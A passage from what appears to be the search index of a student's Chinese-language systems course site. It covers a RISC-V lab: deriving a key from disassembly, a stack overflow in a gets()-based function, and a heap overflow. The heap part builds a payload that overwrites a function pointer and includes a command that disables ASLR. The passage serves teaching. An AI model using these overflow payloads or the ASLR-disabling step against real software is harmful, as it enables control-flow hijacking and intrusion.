\u51fd\u6570\u90e8\u5206\u5c31\u662f\u4f9d\u6b21\u8c03\u7528\u4e86 read_student \u548c read_key \u51fd\u6570\uff0c\u6240\u4ee5\u9700\u8981\u770b\u8fd9\u4e24\u4e2a\u51fd\u6570\u7684\u6c47\u7f16\u4ee3\u7801</p> <p>\u901a\u8fc7\u5206\u6790\u5f97\u5230\u4e24\u4e2a\u51fd\u6570\u7684\u5e27\u6808\u5e03\u5c40\uff1a</p> <p>read_student \u51fd\u6570\u6709\u4e00\u884c\uff1a <pre><code>   104a6:   35e9                    jal 10370 &lt;exit@plt&gt;\n</code></pre> \u4e0d\u96be\u770b\u51fa\u5b83\u524d\u9762\u8bfb\u53d6\u4e86\u5b66\u53f7\u5230\u5c40\u90e8\u53d8\u91cf s0-40 \u4e2d\uff0c\u7136\u540e\u5224\u65ad\u662f\u5426\u90fd\u662f\u6570\u5b57\uff0c\u5982\u679c\u4e0d\u662f\u5219\u4f1a\u6267\u884c\u8fd9\u4e00\u53e5 exit\uff0c\u800c\u540e\u662f\u4e00\u6bb5\u5faa\u73af <pre><code>   104bc:   fe042423    sw  zero,-24(s0)\n   104c0:   a035            j   104ec &lt;read_student+0x94&gt;\n   104c2:   fe842783    lw  a5,-24(s0)\n   104c6:   17c1            addi    a5,a5,-16\n   104c8:   97a2            add a5,a5,s0\n   104ca:   fe87c783    lbu a5,-24(a5)\n   104ce:   fd078713    addi    a4,a5,-48\n   104d2:   67c9            lui a5,0x12\n   104d4:   02878693    addi    a3,a5,40 # 12028 &lt;number&gt;\n   104d8:   fe842783    lw  a5,-24(s0)\n   104dc:   078a            slli    a5,a5,0x2\n   104de:   97b6            add a5,a5,a3\n   104e0:   c398            sw  a4,0(a5)\n   104e2:   fe842783    lw  a5,-24(s0)\n   104e6:   0785            addi    a5,a5,1\n   104e8:   fef42423    sw  a5,-24(s0)\n   104ec:   fe842703    lw  a4,-24(s0)\n   104f0:   4791            li  a5,4\n   104f2:   fce7d8e3    bge a5,a4,104c2 &lt;read_student+0x6a&gt;\n</code></pre> \u9605\u8bfb\u53d1\u73b0\u5faa\u73af\u53d8\u91cf -24(s0) \u4ece 0 \u5faa\u73af\u5230 4\uff0c\u6bcf\u6b21\u53d6\u51fa\u8f93\u5165\u4e2d\u7684\u5b57\u7b26 input[i] \u7136\u540e\u51cf\u53bb '0'(48)\uff080x104ce \u884c\uff09\u5b58\u5165\u5168\u5c40\u53d8\u91cf number[i]\uff08\u5728 .data \u6bb5\u4e2d\uff09\u3002\u56e0\u4e3a\u5b66\u53f7\u524d\u4e94\u4f4d\u662f 32101\uff0c\u6240\u4ee5\u5bf9\u5e94 number[0:5] \u4e5f\u5c31\u662f [3, 2, 1, 0, 1]</p> <p>\u540e\u9762\u53c8\u662f\u7c7b\u4f3c\u7684\u5faa\u73af\uff0c\u5faa\u73af\u53d8\u91cf -28(s0) \u4ece 5 \u5faa\u73af\u5230 9\uff0c\u6bcf\u6b21\u53d6\u51fa input[i] \u5e76\u7528 '9'(57) \u51cf\u53bb\u5b83\u5b58\u5165 number[i]\u3002\u56e0\u4e3a\u5b66\u53f7\u540e\u4e94\u4f4d\u662f &lt;\u9690\u79c1\u55b5&gt;\uff0c\u6240\u4ee5\u5bf9\u5e94 number[5:10] \u4e5f\u5c31\u662f &lt;\u9690\u79c1\u55b5&gt;</p> <p>\u518d\u770b read_key \u51fd\u6570\uff0c\u5b83\u5c06 -20(s0) \u8d4b\u503c\u4e3a\u4e86 0\uff0c\u7136\u540e\u8bfb\u5165\u4e86\u4e00\u4e2a\u6570\u5b57\u5230 s0-32 \u4e2d\uff0c\u4e4b\u540e\u662f\u4e00\u6bb5\u5faa\u73af <pre><code>   10562:   fe042423    sw  zero,-24(s0)\n   10566:   a01d            j   1058c &lt;read_key+0x4a&gt;\n   10568:   67c9            lui a5,0x12\n   1056a:   02878713    addi    a4,a5,40 # 12028 &lt;number&gt;\n   1056e:   fe842783    lw  a5,-24(s0)\n   10572:   078a            slli    a5,a5,0x2\n   10574:   97ba            add a5,a5,a4\n   10576:   439c            lw  a5,0(a5)\n   10578:   fec42703    lw  a4,-20(s0)\n   1057c:   97ba            add a5,a5,a4\n   1057e:   fef42623    sw  a5,-20(s0)\n   10582:   fe842783    lw  a5,-24(s0)\n   10586:   0785            addi    a5,a5,1\n   10588:   fef42423    sw  a5,-24(s0)\n   1058c:   fe842703    lw  a4,-24(s0)\n   10590:   47a5            li  a5,9\n   10592:   fce7dbe3    bge a5,a4,10568 &lt;read_key+0x26&gt;\n   10596:   fe042783    lw  a5,-32(s0)\n   1059a:   fec42703    lw  a4,-20(s0)\n   1059e:   00f71863    bne a4,a5,105ae &lt;read_key+0x6c&gt;\n</code></pre> \u5faa\u73af\u53d8\u91cf -24(s0) \u4ece 0 \u5230 9\uff0c\u5faa\u73af\u4f53\u4e2d\u4e00\u6b21\u6b21\u53d6\u51fa number[i] \u5e76\u7d2f\u52a0\u5230 -20(s0) \u4e2d\uff0c\u6700\u540e\u5c06 -32(s0) \u5373\u8f93\u5165\u4e0e\u5f97\u5230\u7684\u7ed3\u679c -20(s0) \u76f8\u6bd4\u8f83\uff0c\u5224\u65ad\u662f\u5426\u76f8\u7b49\uff0c\u6240\u4ee5\u8981\u8f93\u5165\u7684 key \u4e5f\u5c31\u662f number \u6570\u7ec4\u7684\u548c\uff0c\u5f97\u5230 3+2+1+0+1+&lt;\u9690\u79c1\u55b5&gt; = ? \u4e5f\u5c31\u662f\u6211\u7684\u5b66\u53f7\u5bf9\u5e94\u7684 key\uff0c\u586b\u8fdb\u53bb\u7b54\u6848\u6b63\u786e</p>"},{"location":"cs/system/cs1/lab4-2/#buffer-overflow","title":"Buffer Overflow","text":"<p>bof.c \u6587\u4ef6\u4e2d\u7684 hear \u51fd\u6570\u56e0\u4e3a\u4f7f\u7528 gets \u51fd\u6570\u5bfc\u81f4\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e <pre><code>int hear(unsigned int stu_id){\n    char p1 = 'N';\n    char p2 = 'Y';\n    char str[LENGTH];\n    gets(str);\n    if (p1==p2) {\n        printf(\"Wow [%u] you successfully overflow me!\\n\", stu_id);\n        return 1;\n    } else {\n        printf(\"[%u], you can`t hack me,please try again!\\n\", stu_id);\n        return 0;\n    }\n}\n</code></pre> \u5f88\u663e\u7136\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u8f93\u5165 str \u5229\u7528\u7f13\u51b2\u533a\u6ea2\u51fa\u6765\u4fee\u6539\u5c40\u90e8\u53d8\u91cf p1\u3001p2\uff0c\u4f7f\u5176\u76f8\u7b49</p>"},{"location":"cs/system/cs1/lab4-2/#_2","title":"\u7f16\u8bd1\u4e0e\u53cd\u7f16\u8bd1","text":"<p>\u4f7f\u7528 riscv32-unknown-linux-gnu-gcc bof.c -o bof \u6765\u8fdb\u884c\u7f16\u8bd1</p> <p>\u518d\u901a\u8fc7 riscv32-unknown-linux-gnu-objdump -d bof &gt; bof.s \u6765\u53cd\u7f16\u8bd1\u3001\u91cd\u5b9a\u5411\u5f97\u5230\u6c47\u7f16\u6587\u4ef6</p>"},{"location":"cs/system/cs1/lab4-2/#_3","title":"\u901a\u8fc7\u6c47\u7f16\u4ee3\u7801\u5206\u6790\u5e27\u6808","text":"<p>\u4e3b\u8981\u5173\u6ce8 hear \u51fd\u6570\u7684\u6c47\u7f16\u4ee3\u7801 <pre><code>000104e8 &lt;hear&gt;:\n   104e8:   7179            addi    sp,sp,-48\n   104ea:   d606            sw  ra,44(sp)\n   104ec:   d422            sw  s0,40(sp)\n   104ee:   1800            addi    s0,sp,48\n   104f0:   fca42e23    sw  a0,-36(s0)\n   104f4:   04e00793    li  a5,78\n   104f8:   fef407a3    sb  a5,-17(s0)\n   104fc:   05900793    li  a5,89\n   10500:   fef40723    sb  a5,-18(s0)\n   10504:   fe440793    addi    a5,s0,-28\n   10508:   853e            mv  a0,a5\n   1050a:   3ddd            jal 10400 &lt;gets@plt&gt;\n   1050c:   fef44703    lbu a4,-17(s0)\n   10510:   fee44783    lbu a5,-18(s0)\n   10514:   00f71a63    bne a4,a5,10528 &lt;hear+0x40&gt;\n   10518:   fdc42583    lw  a1,-36(s0)\n   1051c:   67c1            lui a5,0x10\n   1051e:   61878513    addi    a0,a5,1560 # 10618\n   10522:   3dfd            jal 10420 &lt;printf@plt&gt;\n   10524:   4785            li  a5,1\n   10526:   a801            j   10536 &lt;hear+0x4e&gt;\n   10528:   fdc42583    lw  a1,-36(s0)\n   1052c:   67c1            lui a5,0x10\n   1052e:   64078513    addi    a0,a5,1600 # 10640\n   10532:   35fd            jal 10420 &lt;printf@plt&gt;\n   10534:   4781            li  a5,0\n   10536:   853e            mv  a0,a5\n   10538:   50b2            lw  ra,44(sp)\n   1053a:   5422            lw  s0,40(sp)\n   1053c:   6145            addi    sp,sp,48\n   1053e:   8082            ret\n</code></pre> \u9996\u5148\u901a\u8fc7 addi sp,sp,-48 \u5f00\u8f9f\u4e86 hear \u7684\u51fd\u6570\u6808\u7a7a\u95f4\uff0c\u7136\u540e\u5b58\u5165 ra \u4e0e s0\uff08\u8fd4\u56de\u5730\u5740\u4e0e\u524d\u5e27\u6307\u9488\uff09\uff0c\u518d\u8d4b\u503c\u4e86\u5e27\u6307\u9488 s0\uff0c\u5c06\u53c2\u6570 a0\uff08stu_id\uff0c32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff09\u5b58\u5165 -36(s0)\uff0c\u5c06 \"N\"(78) \u653e\u5165 -17(s0)\u3001\"Y\"(89) \u653e\u5165 -18(s0)\u3002\u7136\u540e\u5c06 s0-28 \u8d4b\u503c\u7ed9 a5 \u548c a0\uff0c\u5e76\u8c03\u7528 gets \u51fd\u6570\uff0c\u4e5f\u5c31\u8bf4\u660e\u4ece s0-28 \u5f00\u59cb\u7684 10 \u4e2a\u5b57\u8282\u7a7a\u95f4\u662f str\u3002\u6700\u540e\u53d6\u51fa -17(s0) -18(s0) \u5e76\u6bd4\u8f83\uff0c\u7136\u540e\u662f\u4e00\u7cfb\u5217\u63a7\u5236\u8f93\u51fa\u7684\u64cd\u4f5c\u3002\u6700\u540e\u53d6\u51fa\u5b58\u4e0b\u7684 ra \u548c s0\uff0c\u518d\u6e05\u9664\u6808\u7a7a\u95f4\uff0c\u7136\u540e\u8fd4\u56de\u3002</p> <p>\u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u5e27\u6808\u7684\u5e03\u5c40\u5982\u4e0b\uff1a</p>"},{"location":"cs/system/cs1/lab4-2/#payload","title":"\u6784\u9020 payload","text":"<p>gets \u51fd\u6570\u5e76\u4e0d\u4f1a\u68c0\u67e5\u8f93\u5165\u957f\u5ea6\uff0c\u800c\u4e14\u8f93\u5165\u662f\u4ece\u5c0f\u5730\u5740\u5411\u5927\u5730\u5740\u6269\u5c55\uff0c\u56e0\u4e3a str \u4e0e p1 p2 \u90fd\u662f\u8fde\u7740\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u8f93\u5165 12 \u4e2a\u5b57\u7b26\uff0c\u5e76\u4e14\u6700\u540e\u4e24\u4e2a\u5b57\u7b26\u76f8\u540c\u5219\u4f1a\u66f4\u6539 p1 p2 \u4f7f\u5176\u76f8\u7b49\u3002\uff08\u6ce8\u610f\u8fd9\u91cc\u4e0d\u80fd\u8f93\u5165 10 \u4e2a\u4efb\u610f\u5b57\u7b26\u52a0\u4e00\u4e2a \"N\"\uff0c\u56e0\u4e3a gets \u4e00\u4e2a\u5b57\u7b26\u4e32\u4f1a\u5728\u7ed3\u5c3e\u52a0\u4e0a \"\\0\" \u4e5f\u5c31\u662f 0\uff0c\u6539\u53d8 p1 \u53d8\u6210\u4e86 0\uff0c\u4e0d\u4f1a\u518d\u7b49\u4e8e \"N\"\uff09 </p>"},{"location":"cs/system/cs1/lab4-2/#_4","title":"\u6210\u529f\u6ea2\u51fa\u4f46\u6bb5\u9519\u8bef","text":"<p>\u5982\u679c str \u6ea2\u51fa\u7684\u8fc7\u591a\u5bfc\u81f4\u6539\u53d8\u4e86\u524d\u5e27\u6307\u9488\uff08s0-8\uff09\u6216\u8fd4\u56de\u5730\u5740\uff08s0-4\uff09\u5c31\u53ef\u80fd\u4f1a\u5bfc\u81f4\u540e\u7eed\u7684\u64cd\u4f5c\u4e2d\u56e0\u4e3a\u524d\u5e27\u6307\u9488\u6539\u53d8\u5bfc\u81f4\u6808\u6307\u9488\u4f4d\u7f6e\u9519\u8bef\u6216\u8fd4\u56de\u4e0d\u6210\u529f\uff0c\u51fa\u73b0\u6bb5\u9519\u8bef\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8db3\u591f\u591a\u4efb\u610f\u5b57\u7b26\uff08\u4fdd\u8bc1 p1 p2 \u76f8\u7b49\uff09\u5c31\u53ef\u4ee5\u8fbe\u5230\u6210\u529f\u6ea2\u51fa\u4f46\u662f\u6bb5\u9519\u8bef\u7684\u7ed3\u679c\uff1a </p>"},{"location":"cs/system/cs1/lab4-2/#bonus-heap-overflow","title":"Bonus: Heap Overflow","text":""},{"location":"cs/system/cs1/lab4-2/#_5","title":"\u53cd\u7f16\u8bd1\u5206\u6790\u6c47\u7f16\u4ee3\u7801","text":"<p>objdump \u53cd\u7f16\u8bd1\u540e\u53d1\u73b0\u6709\u5f88\u591a target_ \u51fd\u6570\uff0c\u627e\u5230\u6211\u7684\u5b66\u53f7 &lt;\u9690\u79c1\u55b5&gt; \u5bf9\u5e94\u7684\u5730\u5740 0x00010ddc\u3002\u4e5f\u770b\u5230\u4e86 say_goodbye \u548c repeat_words \u4ee5\u53ca main \u51fd\u6570\u3002\u4e0b\u9762\u4e3b\u8981\u5206\u6790 main \u51fd\u6570\u53ca\u5176\u5bf9\u5e94\u5e27\u6808\uff1a</p>"},{"location":"cs/system/cs1/lab4-2/#malloc","title":"malloc \u90e8\u5206","text":"<p><pre><code>   1100c:   4541        li  a0,16\n   1100e:   be2ff0ef    jal ra,103f0 &lt;malloc@plt&gt;\n   11012:   87aa        mv  a5,a0\n   11014:   fef42623    sw  a5,-20(s0)\n   11018:   4521        li  a0,8\n   1101a:   bd6ff0ef    jal ra,103f0 &lt;malloc@plt&gt;\n   1101e:   87aa        mv  a5,a0\n   11020:   fef42423    sw  a5,-24(s0)\n   11024:   fe842783    lw  a5,-24(s0)\n   11028:   6745        lui a4,0x11\n   1102a:   fe070713    addi    a4,a4,-32 # 10fe0 &lt;repeat_words&gt;\n   1102e:   c398        sw  a4,0(a5)\n   11030:   fe842783    lw  a5,-24(s0)\n   11034:   6745        lui a4,0x11\n   11036:   fbc70713    addi    a4,a4,-68 # 10fbc &lt;say_goodbye&gt;\n   1103a:   c3d8        sw  a4,4(a5)\n</code></pre> \u5148\u901a\u8fc7 malloc \u7533\u8bf7 16 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u7a7a\u95f4\uff0c\u5c06\u5730\u5740\u653e\u5165 -20(s0)\uff0c\u518d\u901a\u8fc7 malloc \u7533\u8bf7 8 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u7a7a\u95f4\uff0c\u653e\u5165 -24(s0)\u3002\u7136\u540e\u5c06 repeat_words \u51fd\u6570\u548c say_goodbye \u51fd\u6570\u7684\u5730\u5740\u5206\u522b\u653e\u5165\u540e\u4e00\u4e2a\u5806\u7a7a\u95f4\u7684\u524d 4 \u5b57\u8282\u548c\u540e 4 \u5b57\u8282\u4e2d\u3002</p> <p>\u4e2d\u95f4\u8bfb\u5165\u5b66\u53f7\u548c\u8f93\u51fa\u63d0\u793a\u7b26\u7684\u90e8\u5206\u4e0d\u591a\u5206\u6790</p>"},{"location":"cs/system/cs1/lab4-2/#_6","title":"\u8f93\u5165\u4e0e\u8c03\u7528\u51fd\u6570\u90e8\u5206","text":"<pre><code>   1106c:   8381a783    lw  a5,-1992(gp) # 14038 &lt;stdin@GLIBC_2.29&gt;\n   11070:   863e            mv  a2,a5\n   11072:   03200593    li  a1,50\n   11076:   fec42503    lw  a0,-20(s0)\n   1107a:   ba6ff0ef    jal ra,10420 &lt;fgets@plt&gt;\n   1107e:   fe842783    lw  a5,-24(s0)\n   11082:   439c            lw  a5,0(a5)\n   11084:   fec42503    lw  a0,-20(s0)\n   11088:   9782            jalr    a5\n   1108a:   fe842783    lw  a5,-24(s0)\n   1108e:   43d8            lw  a4,4(a5)\n   11090:   84018513    addi    a0,gp,-1984 # 14040 &lt;id_str&gt;\n   11094:   9702            jalr    a4\n</code></pre> <p>\u5148\u901a\u8fc7 fgets \u51fd\u6570\u8bfb\u53d6\u81f3\u591a 50 \u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u5230 -20(s0)\uff08\u7b2c\u4e00\u4e2a\u5806\u7a7a\u95f4\uff09\u4e2d\u3002\u7136\u540e\u53d6\u51fa -20(s0) \u7684\u5185\u5bb9\u4f5c\u4e3a\u53c2\u6570\u95f4\u63a5\u8c03\u7528 -24(s0) \u7684\u524d 4 \u5b57\u8282\u4f4d\u7f6e\u7684\u51fd\u6570\u3002\u518d\u53d6\u51fa id_str\uff08\u5b58\u5728\u5168\u5c40\u53d8\u91cf\u4e2d\u7684\u5b66\u53f7\uff09\u4f5c\u4e3a\u53c2\u6570\u95f4\u63a5\u8c03\u7528\u7b2c\u4e8c\u4e2a\u5806\u7a7a\u95f4\u7684\u540e 4 \u5b57\u8282\u4f4d\u7f6e\u7684\u51fd\u6570\u3002</p> <p>\u6700\u540e free \u4e24\u4e2a\u5806\u7a7a\u95f4\u5e76 exit\u3002\u6700\u7ec8\u6574\u4e2a\u51fd\u6570\u7684\u5e27\u6808\u548c\u8c03\u7528\u6d41\u7a0b\u5982\u4e0b\u56fe\uff1a </p>"},{"location":"cs/system/cs1/lab4-2/#_7","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>\u5f88\u660e\u663e\uff0cfgets \u8bfb\u53d6\u81f3\u591a 50 \u5b57\u8282\u7684\u5185\u5bb9\u5230\u7b2c\u4e00\u4e2a\u5806\u7a7a\u95f4\uff0c\u4f46\u662f\u8be5\u5806\u7a7a\u95f4\u53ea\u7533\u8bf7\u4e86 16 \u5b57\u8282\u7684\u5927\u5c0f\uff0c\u56e0\u6b64\u53ef\u80fd\u4f1a\u9020\u6210\u5806\u6ea2\u51fa\u3002\u5e76\u4e14\u8fd9\u4e2a\u5806\u7a7a\u95f4\u662f\u5148\u7533\u8bf7\u7684\uff0c\u4e0b\u4e00\u4e2a\u5b58\u6709\u51fd\u6570\u5730\u5740\u7684\u5806\u7a7a\u95f4\u6b63\u597d\u5728\u5176\u4e0b\u65b9\uff08\u5927\u5730\u5740\u65b9\u5411\uff09\uff0c\u6240\u4ee5 fgets \u6ea2\u51fa\u7684\u8f93\u5165\u53ef\u4ee5\u76f4\u63a5\u8986\u76d6\u7b2c\u4e8c\u4e2a\u5806\u7a7a\u95f4\u7684\u5185\u5bb9\uff0c\u4f7f\u5f97\u5176\u4e2d\u5b58\u7684\u5730\u5740\u53d1\u751f\u6539\u53d8\uff0c\u8fdb\u800c\u52ab\u6301\u63a7\u5236\u6d41\u5230 target \u51fd\u6570\u3002</p>"},{"location":"cs/system/cs1/lab4-2/#_8","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u867d\u7136\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u6765\u6ea2\u51fa\u8986\u76d6\u7b2c\u4e8c\u4e2a\u5806\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u7531\u4e8e\u5806\u7684\u7ed3\u6784\u4e0d\u50cf\u6808\u4e00\u6837\u53ea\u4fdd\u5b58\u6570\u636e\uff0c\u5b83\u8fd8\u6709 header \u4fe1\u606f\uff0c\u5982\u679c\u76f4\u63a5\u8986\u76d6\u7684\u8bdd\u4f1a\u7834\u574f\u6389 header \u4f7f\u7a0b\u5e8f\u51fa\u73b0\u5f02\u5e38\u3002\u56e0\u6b64\u8fd8\u9700\u8981\u4e86\u89e3\u5806\u7684\u7ed3\u6784</p>"},{"location":"cs/system/cs1/lab4-2/#glibc","title":"glibc \u5806\u7ed3\u6784","text":"<p>glibc \u5806\u7531\u4e00\u4e2a\u4e2a\u5806\u5757\u7ec4\u6210\uff0c\u4f7f\u7528 malloc \u53ef\u4ee5\u5728\u5f53\u524d\u5806\u5757\u4e0b\u65b9\uff08\u5927\u5730\u5740\uff09\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684\u5806\u5757\uff0c\u5806\u5757\u5305\u542b header \u548c data \u4e24\u90e8\u5206\uff0c\u800c malloc \u8fd4\u56de\u7684\u6307\u9488\u6307\u5411\u7684\u662f data \u90e8\u5206\u7684\u9996\u5b57\u8282\uff0c\u5176\u5305\u542b\u81f3\u5c11\u7533\u8bf7\u7684\u5927\u5c0f\u7684\u7a7a\u95f4\u3002header \u7531\u4ee5\u4e0b\u51e0\u90e8\u5206\u7ec4\u6210\uff1a</p> <ul> <li>prev_size: 32 \u4f4d\u7a0b\u5e8f\u4e2d\u662f 4 \u5b57\u8282\uff0c\u5982\u679c\u5f53\u524d\u7684\u4e0a\u4e00\u4e2a\u5806\u5757\uff08\u5c0f\u5730\u5740\u65b9\u5411\uff09\u6b63\u5728\u4f7f\u7528\uff0c\u5219 prev_size \u53ef\u4ee5\u4f5c\u4e3a\u4e0a\u4e00\u4e2a\u5806\u5757\u7684\u4e00\u90e8\u5206\uff0c\u5b58\u50a8\u6570\u636e\u3002\u5982\u679c\u4e0a\u4e00\u4e2a\u5806\u5757\u5df2\u7ecf\u88ab free \u4e86\uff0c\u5219 prev_size \u8868\u793a\u4e0a\u4e00\u4e2a\u5806\u5757\u7684\u5927\u5c0f</li> <li>size: 32 \u4f4d\u7a0b\u5e8f\u4e2d\u662f 4 \u5b57\u8282\uff0c\u8868\u793a\u6574\u4e2a\u5806\u5757\uff08\u5305\u542b header\uff09\u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u4e00\u5b9a\u662f 8 \u7684\u500d\u6570\uff08\u4e0d\u7136\u6269\u5230 8 \u7684\u500d\u6570\uff09\u56e0\u4e3a\u5927\u5c0f\u4e00\u5b9a\u662f 8 \u7684\u500d\u6570\uff0c\u6240\u4ee5\u6700\u540e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u53ef\u4ee5\u4e0d\u4e0e\u5927\u5c0f\u6709\u5173\uff08\u8bfb\u53d6\u5927\u5c0f\u65f6\u76f4\u63a5\u5c06\u540e\u4e09\u4e2a\u6bd4\u7279\u8bbe\u4e3a 0\uff09\uff0c\u56e0\u6b64\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u8868\u793a\u4ee5\u4e0b\u4e09\u4e2a\u6807\u5fd7\uff1a<ul> <li>NON_MAIN_ARENA: \u5f53\u524d\u5806\u5757\u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1 \u4e0d\u5c5e\u4e8e\uff0c0 \u5c5e\u4e8e</li> <li>IS_MAPPED: \u5f53\u524d\u5806\u5757\u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\uff08\u5982\u679c\u7533\u8bf7\u7a7a\u95f4\u8fc7\u5927\u5219\u7531 mmap \u5206\u914d\uff09</li> <li>PREV_INUSE: \u524d\u4e00\u4e2a\u5806\u5757\u662f\u5426\u88ab\u4f7f\u7528\uff0c\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5806\u5757\u8fd9\u91cc\u662f 1\uff0c\u540e\u9762\u7684\u5982\u679c\u524d\u4e00\u5806\u5757\u6b63\u5728\u4f7f\u7528\u5219\u662f 1\u3001\u88ab free \u4e86\u5219\u662f 0</li> </ul> </li> <li>user data: \u6570\u636e\u90e8\u5206\uff08\u5982\u679c\u5f53\u524d\u5806\u5757\u88ab free \u4e86\u5219\u4f1a\u4fdd\u5b58 fd bk fd_nextsize bk_nextsize \u4fe1\u606f\uff09</li> </ul> <p>\u5982\u679c\u6ca1\u6709\u5f00\u542f ASLR\uff08\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\uff09\u5219\u4e24\u4e2a\u5806\u5757\u662f\u7d27\u6328\u7740\u7684\uff0c\u5982\u679c\u5f00\u542f\u4e86 ASLR \u5219\u4e24\u4e2a\u5806\u5757\u4e2d\u95f4\u6709\u968f\u673a\u5927\u5c0f\u7684\u95f4\u9694\u3002ASLR \u5728 Linux \u4e0a\u901a\u8fc7 echo 0 &gt; /proc/sys/kernel/randomize_va_space \u6765\u5173\u95ed\uff08\u5728\u505a\u8fd9\u9898\u7684\u65f6\u5019\u9700\u8981\u5173\u95ed\uff09</p> <p>\u5e76\u4e14\u6bcf\u4e2a\u5806\u5757\u4f1a\u5bf9\u9f50\u5230 0x10(16) \u7684\u6574\u6570\u500d\u5b57\u8282\uff0c\u5c11\u7684\u8bdd\u5219\u5728 user data \u540e\u9762\u8865\u5145\uff0c\u8fd9\u4e2a\u4e5f\u4f1a\u5f71\u54cd\u5230 size</p>"},{"location":"cs/system/cs1/lab4-2/#_9","title":"\u5206\u6790\u9898\u4e2d\u7684\u5806","text":"<p>\u9898\u76ee\u7533\u8bf7\u4e86\u4e24\u4e2a\u5806\u5757\uff0c\u4e00\u4e2a\u662f 16 \u5b57\u8282\u5927\u5c0f\uff0c\u53e6\u4e00\u4e2a 8 \u5b57\u8282\u5927\u5c0f\uff0c\u5b83\u4eec\u7684 prev_size \u90fd\u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u53ef\u4ee5\u88ab\u586b\u5165\u4efb\u610f\u5185\u5bb9</p> <ul> <li>16 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u5757\u52a0\u4e0a 8 \u5b57\u8282\u7684 prev_size \u548c size \u540e\u53d8\u6210 24 \u5b57\u8282\uff0c\u5bf9\u9f50\u5230 16 \u7684\u500d\u6570\u4e3a 32 \u5b57\u8282\uff0cNON_MAIN_ARENA \u4e3a 0\uff0cIS_MAPPED \u4e3a 0\uff0cPREV_INUSE \u4e3a 1\uff0c\u6240\u4ee5 size \u90e8\u5206\u4e3a 0b100001(0x21)</li> <li>8 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u5757\u52a0\u4e0a 8 \u5b57\u8282 prev_size \u548c size \u540e\u53d8\u6210 16 \u5b57\u8282\uff0c\u6b63\u597d\u4e3a 16 \u6574\u6570\u500d\uff0c\u4e09\u4e2a\u6807\u5fd7\u540c\u6837\u4e3a 001\uff0c\u6240\u4ee5 size \u4e3a 0b10001(0x11)</li> </ul> <p>\u56e0\u6b64\u7b2c\u4e00\u4e2a\u5806\u5757\u7684 header \u4e0b\u6709 28 \u5b57\u8282\u7684\u7a7a\u95f4\uff0c\u7b2c\u4e8c\u4e2a\u5806\u5757\u7684 header \u4e0b\u6709 8 \u5b57\u8282\u7a7a\u95f4\uff0c\u4e14\u5df2\u7ecf\u586b\u5165\u4e24\u4e2a\u51fd\u6570\u5730\u5740</p>"},{"location":"cs/system/cs1/lab4-2/#payload_1","title":"\u6784\u9020 payload","text":"<p>\u56e0\u4e3a prev_size \u662f\u7a7a\u95f2\u72b6\u6001\u53ef\u4ee5\u968f\u610f\u4f7f\u7528\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u6ea2\u51fa\u65f6\u7ed5\u8fc7\u7b2c\u4e8c\u4e2a\u5806\u5757\u7684 size \u5c31\u597d\u4e86\uff0c\u6574\u4e2a\u5806\u7684\u7ed3\u6784\u548c\u5229\u7528\u65b9\u5f0f\u5982\u4e0b\uff1a</p> <p>\u5373\u5148\u4f7f\u7528 28 \u4e2a\u4efb\u610f\u5b57\u7b26\u5360\u6ee1\u7b2c\u4e00\u4e2a\u5806\u7684 data \u548c\u7b2c\u4e8c\u4e2a\u5806\u7684 prev_size\uff0c\u518d\u8865\u4e0a\u7b2c\u4e8c\u4e2a\u5806\u7684 size\uff0c\u7136\u540e\u63a5\u60f3\u8981\u88ab\u8c03\u7528\u7684\u5730\u5740\uff08\u5373\u6211\u7684\u5b66\u53f7\u5bf9\u5e94\u7684 target \u5730\u5740 0x00010ddc\uff09\u3002\u6700\u540e\u9632\u6b62\u7b2c\u4e8c\u4e2a\u51fd\u6570\u6307\u9488\u88ab\u7834\u574f\u5bfc\u81f4\u5f02\u5e38\u9000\u51fa\uff0c\u518d\u8865\u4e0a\u4e00\u4e2a say_goodbye \u7684\u51fd\u6570\u5730\u5740 0x00010fbc\uff0c\u8fd9\u6837\u5b57\u7b26\u4e32\u7ed3\u5c3e\u7684 \"\\0\" \u5c31\u4f1a\u88ab\u653e\u5728\u8fd9\u4e2a\u5806\u5757\u7684\u5916\u9762\uff0c\u4e0d\u4f1a\u5bf9\u7a0b\u5e8f\u8fd0\u884c\u9020\u6210\u5f71\u54cd</p> <p>\u6240\u4ee5 payload \u5c31\u662f \"AAAAAAAAAAAAAAAAAAAAAAAAAAAA \\x11\\x00\\x00\\x00\\xdc\\x0d\\x01\\x00\\xbc\\x0f\\x01\\x00\"\uff08\u6ce8\u610f\u5c0f\u7aef\u5e8f\uff09 </p>"},{"location":"cs/system/cs1/lab5-1/","title":"\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1","text":"<p> \u7ea6 1838 \u4e2a\u5b57  337 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab5-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.05.20 ~ 2022.06.10\uff09</p> <p>Warning</p> 